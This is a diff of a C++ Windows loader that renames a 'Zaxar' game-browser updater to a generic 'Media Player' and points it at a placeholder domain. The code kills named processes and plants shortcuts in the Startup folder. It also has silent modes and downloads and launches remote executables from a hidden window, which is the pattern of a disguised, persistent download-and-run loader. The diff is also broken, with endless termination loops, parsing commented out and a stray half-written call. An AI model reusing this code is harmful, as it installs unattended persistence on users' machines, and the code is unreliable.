@@ -9,7 +9,7 @@
 
 const TCHAR					mSzTitle[] = L"Media Player";
 const TCHAR					mSzWindowClass[] = L"MediaPlayerLoaderWindowClass";
-const TCHAR					mSzFileListUrl[] = L"/client/update.php?c=filesclient&f=xms&version=4.001&guid=";
+const TCHAR					mSzFileListUrl[] = L"/client/update.php?c=filesclient&f=xms&version=1.001&guid=";
 
 HWND						hWnd;
 HWND						hProgBar;
@@ -28,13 +28,13 @@ bool						IsVerySilent = false;
 bool						IsSilent = false;
 HBITMAP						hCancelButtonBitmap;
 
-COLORREF BackgroundColor = RGB(56,54,53);
+COLORREF BackgroundColor = RGB(240,240,240);
 COLORREF WhiteColor = RGB(255, 255, 255);
 COLORREF GrayColor = RGB(142, 137, 134);
-HBRUSH hBackgroundBrush = CreateSolidBrush(BackgroundColor);
+HBRUSH hBackgroundBrush = CreateSolidBrush(WhiteColor);
 
 // Forward declarations of functions included in this code module:
-ATOM				ZaxarRegisterClass(HINSTANCE hInstance);
+ATOM				RegisterClass(HINSTANCE hInstance);
 BOOL				InitInstance(HINSTANCE, int);
 LRESULT CALLBACK	WndProc(HWND, UINT, WPARAM, LPARAM);
 unsigned			__stdcall PrepareDownloadThread(void *data);
@@ -45,9 +45,9 @@ void				RestartLoader();
 LONG WINAPI			SEHFilter(struct _EXCEPTION_POINTERS* ExceptionInfo);
 int SEHFilter2(unsigned int code, struct _EXCEPTION_POINTERS *ep);
 
-void				StartGB();
-bool				WaitGB(HANDLE hProcess);
-bool				IsGBLoaderInstanceAlreadyExists();
+void				StartLoader();
+bool				WaitPlayer(HANDLE hProcess);
+bool				IsLoaderInstanceAlreadyExists();
 
 volatile HANDLE mutex;
 
@@ -67,17 +67,16 @@ int MainImpl(HINSTANCE hInstance,
 		InitMD5();
 
 		// Убьём лишние процессе которе могут помешать апдейту
-		TerminateExcessProcesses();
+		while(!TerminateProcess(L"Loader.exe")){}
 
 		Sleep(2000);
 
-		TerminateExcessProcesses();
+		while(!TerminateProcess(L"Player.exe")){}
 
-		SetDomainToUpdate(L"http://www.zaxargames.com");
+		SetDomainToUpdate(L"http://www.somedomane.com");
 
 		SetCurrentDirectoryA(ExePath().c_str());
 
-		RemoveLinksToOldGB();
 		CreateLinkToLoader();
 		CreateLinkToLoaderInStartupFolder();	
 		CreateLinkToLoaderInStartMenu();
@@ -108,16 +107,15 @@ int MainImpl(HINSTANCE hInstance,
 			Sleep(60 * 60 * 1000);
 		}
 
-		//InitializeCriticalSectionAndSpinCount(&mCriticalSection, 0x00000400);
 		InitializeCriticalSection(&mCriticalSection);
 
 		CreateLinkToLoader();
 
 		if(!IsSilent)
 		{
-			_beginthreadex(NULL, 0, PrepareDownloadThread, NULL, 0, NULL);
+			//_beginthreadex(NULL, 0, PrepareDownloadThread, NULL, 0, NULL);
 
-			ZaxarRegisterClass(hInstance);
+			RegisterClass(hInstance);
 
 			// Perform application initialization:
 			if (!InitInstance (hInstance, nCmdShow))
@@ -165,7 +163,7 @@ int APIENTRY _tWinMain(HINSTANCE hInstance,
 	return 0;
 }
 
-ATOM ZaxarRegisterClass(HINSTANCE hInstance)
+ATOM RegisterClass(HINSTANCE hInstance)
 {
 	try
 	{
@@ -199,7 +197,7 @@ BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
 	{
 		hInst = hInstance; // Store instance handle in our global variable
 
-		hWnd = CreateWindowEx(0, mSzWindowClass, mSzTitle, WS_POPUPWINDOW ,
+		hWnd = CreateWindowEx(0, mSzWindowClass, mSzTitle, WS_OVERLAPPEDWINDOW ,
 			500, 400,
 			370, 108,
 			NULL, NULL, hInstance, NULL);
@@ -231,39 +229,16 @@ void PrepareDownloadImpl()
 		if(!HttpDownload(updateUrl, &xml))
 		{
 			xml.clear();
-
-			if(UpdateFromSpareDomain())
-			{
-				SetDomainToUpdate(L"http://www.zaxarstore.com");
-				updateUrl = DomainToUpdate() +  mSzFileListUrl + guid;
-
-				if(!HttpDownload(updateUrl, &xml))
-				{
-					xml.clear();
-
-					SetDomainToUpdate(L"http://www.zaxarstore.com1");
-					updateUrl = DomainToUpdate() +  mSzFileListUrl + guid;
-
-					if(!HttpDownload(updateUrl, &xml))
-					{
-						xml.clear();
-					}
-				}
-			}
-		}
-		else
-		{
-			SetLastGBSuccessUpdateNow();
 		}
 
 		if(xml.empty())
 		{
 			ShowWindow(hWnd, SW_HIDE);
-			StartGB();
+			StartPlayerProcess(NULL);
 		}
 		else
 		{
-			if(ParseUpdateFilesList(xml, &mFilesToDownload, &mExeFilesToDownload))
+			//if(ParseUpdateFilesList(xml, &mFilesToDownload, &mExeFilesToDownload))
 			{
 				// Sve oroginal list to check before start
 				mFilesToCheck = mFilesToDownload;
@@ -304,7 +279,7 @@ void PrepareDownloadImpl()
 
 				ShowWindow(hWnd,SW_HIDE);
 
-				StartGB();
+				StartLoader();
 			}
 		}
 	}
@@ -410,26 +385,11 @@ void DownloadFileIfNotExists(FileData* fileData)
 
 void DownloadThreadImpl()
 {
-	try
-	{
-		FileData file;
+	FileData file;
 
-		while(GetNextFile(&file))
-		{
-			DownloadFileIfNotExists(&file);
-		}
-	}
-	catch(char* lpstrErr) 
+	while(GetNextFile(&file))
 	{
-		Log((std::string(__FUNCDNAME__) + " unhanded exception: " + lpstrErr).c_str());
-	}
-	catch(std::exception e)
-	{
-		Log((std::string(__FUNCDNAME__) + " unhanded exception: " + e.what()).c_str());
-	}
-	catch(...) 
-	{
-		Log((std::string(__FUNCDNAME__) + " unknown unhanded exception").c_str());
+		DownloadFileIfNotExists(&file);
 	}
 }
 
@@ -458,76 +418,42 @@ unsigned __stdcall DownloadThread(void *data)
 
 bool GetNextFileImpl(FileData * file)
 {
-	try
+	bool result = false;
+
+	EnterCriticalSection(&mCriticalSection);
+	if(!mFilesToDownload.empty())
 	{
-		Log("GetNextFileImpl started\r\n");
 
-		bool result = false;
+		*file = mFilesToDownload.back();
+		mFilesToDownload.pop_back();
 
-		EnterCriticalSection(&mCriticalSection);
-
-		Sleep(1);
-
-		Log("EnterCriticalSection\r\n");
-
-		if(!mFilesToDownload.empty())
+		if(!IsSilent)
 		{
-			Log("!mFilesToDownload.empty()\r\n");
+			int pos = SendMessage(hProgBar, PBM_GETPOS, 0, 0);
+			pos += 1; // increase
+			SendMessage(hProgBar, PBM_SETPOS, pos, 0);
 
-			*file = mFilesToDownload.back();
-			mFilesToDownload.pop_back();
+			float onePecrent =  (float)mFilesCount / 100;
+			float percents =  ((float)(mFilesCount - mFilesToDownload.size()) / onePecrent);
+			TCHAR percentMessage[1024];
 
-			Log("mFilesToDownload.pop_back();\r\n");
-
-			if(!IsSilent)
+			if(IsRussian())
 			{
-				Log("!IsSilent\r\n");
-				
-				int pos = SendMessage(hProgBar, PBM_GETPOS, 0, 0);
-				pos += 1; // increase
-				SendMessage(hProgBar, PBM_SETPOS, pos, 0);
-
-				float onePecrent =  (float)mFilesCount / 100;
-				float percents =  ((float)(mFilesCount - mFilesToDownload.size()) / onePecrent);
-				TCHAR percentMessage[1024];
-
-				if(IsRussian())
-				{
-					wsprintf(percentMessage, L"Media Player - обновление - %d %% завершено", (int)percents);
-				}
-				else
-				{
-					wsprintf(percentMessage, L"Media Player - update - %d %% completed", (int)percents);
-				}
-
-				SetWindowText(hLablePercents, percentMessage);
+				wsprintf(percentMessage, L"Media Player - обновление - %d %% завершено", (int)percents);
+			}
+			else
+			{
+				wsprintf(percentMessage, L"Media Player - update - %d %% completed", (int)percents);
 			}
 
-			result = true;
-		}
-		else
-		{
-			Log("mFilesToDownload.empty()\r\n");
+			SetWindowText(hWnd, percentMessage);
 		}
 
-		LeaveCriticalSection(&mCriticalSection);
+		result = true;
+	}
 
-		Log("LeaveCriticalSection\r\n");
-
-		return result;
-	}
-	catch(char* lpstrErr) 
-	{
-		Log((std::string(__FUNCDNAME__) + " unhanded exception: " + lpstrErr).c_str());
-	}
-	catch(std::exception e)
-	{
-		Log((std::string(__FUNCDNAME__) + " unhanded exception: " + e.what()).c_str());
-	}
-	catch(...) 
-	{
-		Log((std::string(__FUNCDNAME__) + " unknown unhanded exception").c_str());
-	}
+	LeaveCriticalSection(&mCriticalSection);
+	return result;
 }
 
 bool GetNextFile(FileData * file)
@@ -558,8 +484,8 @@ LRESULT CALLBACK WndProc(HWND h, UINT message, WPARAM wParam, LPARAM lParam)
 				hProgBar = CreateWindowEx(0, PROGRESS_CLASS, NULL, WS_CHILD | WS_VISIBLE,
 					10, 66, // position
 					250, 20, h, NULL, hInst, NULL);
-				SendMessage(hProgBar, PBM_SETBARCOLOR, 0, RGB(77,109,140));
-				SetClassLongPtr(hProgBar, GCLP_HBRBACKGROUND, (LONG)CreateSolidBrush(RGB(56,54,53)));
+				SendMessage(hProgBar, PBM_SETBARCOLOR, 0, RGB(0,211,40));
+				SetClassLongPtr(hProgBar, GCLP_HBRBACKGROUND, (LONG)CreateSolidBrush(RGB(77,109,140)));
 
 				hLablePercents = CreateWindow(L"static", L"",
 					WS_CHILD | WS_VISIBLE | WS_TABSTOP,
@@ -575,7 +501,7 @@ LRESULT CALLBACK WndProc(HWND h, UINT message, WPARAM wParam, LPARAM lParam)
 					SetWindowText(hLablePercents, L"Media Player - update - preparing files list");
 				}
 
-				SendMessage(hLablePercents, WM_SETFONT, (WPARAM)GetStockObject(ANSI_VAR_FONT), 0);
+				SendMessage(hLablePercents, WM_SETFONT, (WPARAM)GetStockObject(SYSTEM_FONT), 0);
 
 				hLable = CreateWindow(L"static", L"",
 					WS_CHILD | WS_VISIBLE | WS_TABSTOP,
@@ -591,9 +517,9 @@ LRESULT CALLBACK WndProc(HWND h, UINT message, WPARAM wParam, LPARAM lParam)
 					SetWindowText(hLable, L"Updating Media Player ...");
 				}
 
-				SendMessage(hLable, WM_SETFONT, (WPARAM)GetStockObject(ANSI_VAR_FONT), 0);
+				SendMessage(hLable, WM_SETFONT, (WPARAM)GetStockObject(ANSI_FIXED_FONT), 0);
 
-				hCancelButtonBitmap = (HBITMAP)LoadImage(hInst, L"cancelbutton.bmp", IMAGE_BITMAP, 0, 0, LR_LOADFROMFILE);
+				//hCancelButtonBitmap = (HBITMAP)LoadImage(hInst, L"cancelbutton.bmp", IMAGE_BITMAP, 0, 0, LR_LOADFROMFILE);
 
 				UpdateWindow(hProgBar);
 				UpdateWindow(hCancel);
@@ -602,11 +528,11 @@ LRESULT CALLBACK WndProc(HWND h, UINT message, WPARAM wParam, LPARAM lParam)
 			}
 
 		case WM_CTLCOLORBTN:
-			h = (HWND)lParam;
-			hdc = (HDC) wParam;
-			SetTextColor(hdc, BackgroundColor);
-			SetBkColor(hdc, BackgroundColor);
-			SetBkMode (hdc, TRANSPARENT);
+			//h = (HWND)lParam;
+			//hdc = (HDC) wParam;
+			//SetTextColor(hdc, BackgroundColor);
+			//SetBkColor(hdc, BackgroundColor);
+			//SetBkMode (hdc, TRANSPARENT);
 			return (long)hBackgroundBrush;
 
 		case WM_CTLCOLORSTATIC:
@@ -623,6 +549,7 @@ LRESULT CALLBACK WndProc(HWND h, UINT message, WPARAM wParam, LPARAM lParam)
 		case WM_PAINT:
 			{
 
+				/*
 				PAINTSTRUCT 	ps;
 				BITMAP 			bitmap;
 				HDC 			hdcMem;
@@ -641,6 +568,7 @@ LRESULT CALLBACK WndProc(HWND h, UINT message, WPARAM wParam, LPARAM lParam)
 				DeleteDC(hdcMem);
 
 				EndPaint(hWnd, &ps);
+				*/
 
 				//SetBkColor(GetDC(hCancel), BackgroundColor);
 				//SetBkMode(hdc, TRANSPARENT);
@@ -678,34 +606,20 @@ LRESULT CALLBACK WndProc(HWND h, UINT message, WPARAM wParam, LPARAM lParam)
 
 void RestartLoader()
 {
-	try
-	{
-		TCHAR dir[MAX_PATH];
-		GetCurrentDirectory(MAX_PATH, dir);
+	TCHAR dir[MAX_PATH];
+	GetCurrentDirectory(MAX_PATH, dir);
 
-		if(IsVerySilent)
-		{
-			ShellExecute(NULL, TEXT(""), TEXT("ZaxarLoader.exe"), TEXT("/verysilent"), dir, 0);
-		}
-		else
-		{
-			ShellExecute(NULL, TEXT(""), TEXT("ZaxarLoader.exe"), NULL, dir, 0);
-		}
+	if(IsVerySilent)
+	{
+		ShellExecute(NULL, TEXT(""), TEXT("Loader.exe"), TEXT("/verysilent"), dir, 0);
+	}
+	else
+	{
+		ShellExecute(NULL, TEXT(""), TEXT("Loader.exe"), NULL, dir, 0);
+	}
 
-		TerminateProcess(GetCurrentProcess(), 0);
-	}
-	catch(char* lpstrErr) 
-	{
-		Log((std::string(__FUNCDNAME__) + " unhanded exception: " + lpstrErr).c_str());
-	}
-	catch(std::exception e)
-	{
-		Log((std::string(__FUNCDNAME__) + " unhanded exception: " + e.what()).c_str());
-	}
-	catch(...) 
-	{
-		Log((std::string(__FUNCDNAME__) + " unknown unhanded exception").c_str());
-	}
+	TerminateProcess(GetCurrentProcess(), 0);
+
 }
 
 class MyStackWalker : public StackWalker
@@ -751,7 +665,7 @@ int SEHFilter2(unsigned int code, struct _EXCEPTION_POINTERS *ep)
 	}
 }
 
-bool WaitGB(HANDLE hProcess)
+bool WaitPlayer(HANDLE hProcess)
 {
 	try
 	{
@@ -789,11 +703,11 @@ bool WaitGB(HANDLE hProcess)
 	}
 }
 
-void StartGB()
+void StartLoader()
 {
 	try
 	{
-		TerminateExcessProcesses();
+		//TerminateExcessProcesses();
 
 		FilesList::iterator iter = mFilesToCheck.begin();
 
@@ -804,32 +718,32 @@ void StartGB()
 			iter++;
 		}
 
-		TCHAR gbPathExe[MAX_PATH];
-		GetCurrentDirectory(MAX_PATH, gbPathExe);
-		wsprintf(gbPathExe, L"%s\\ZaxarGameBrowser.exe", gbPathExe);
+		TCHAR pathExe[MAX_PATH];
+		GetCurrentDirectory(MAX_PATH, pathExe);
+		wsprintf(pathExe, L"%s\\Player.exe", pathExe);
 
-		if(!FileExists(gbPathExe))
+		if(!FileExists(pathExe))
 		{
 			Sleep(60 * 60 * 1000);
 			RestartLoader();
 		}
 
-		HANDLE gbHProcess = StartGBProcess(IsSilent || AfterCrash? TEXT("-s") : NULL);
+		HANDLE hProcess = StartPlayerProcess(IsSilent || AfterCrash? TEXT("-s") : NULL);
 
-		if(gbHProcess == INVALID_HANDLE_VALUE)
+		if(hProcess == INVALID_HANDLE_VALUE)
 		{
 			Sleep(60 * 1000);
-			gbHProcess = GetGBProcess();
+			hProcess = GetPlayerProcess();
 
-			if(gbHProcess == INVALID_HANDLE_VALUE)
+			if(hProcess == INVALID_HANDLE_VALUE)
 			{
 				Sleep(60 * 60 * 1000);
 				RestartLoader();
 			}
 		}
 
-		CreateLinkToGB();
-
+		/*
+		WaitForSingleObject(
 		if(WaitGB(gbHProcess))
 		{
 			ExitProcess(0);
@@ -840,6 +754,7 @@ void StartGB()
 			// GB crashed, restart loader to update
 			RestartLoader();
 		}
+		*/
 	}
 	catch(char* lpstrErr) 
 	{
@@ -855,13 +770,7 @@ void StartGB()
 	}
 }
 
-bool WatchGB()
-{
-	HANDLE gbHProcess = GetGBProcess();
-	return true;
-}
-
-bool IsGBLoaderInstanceAlreadyExists()
+bool IsLoaderInstanceAlreadyExists()
 {
 	const char* MutexName = "MediaPlayer";
 
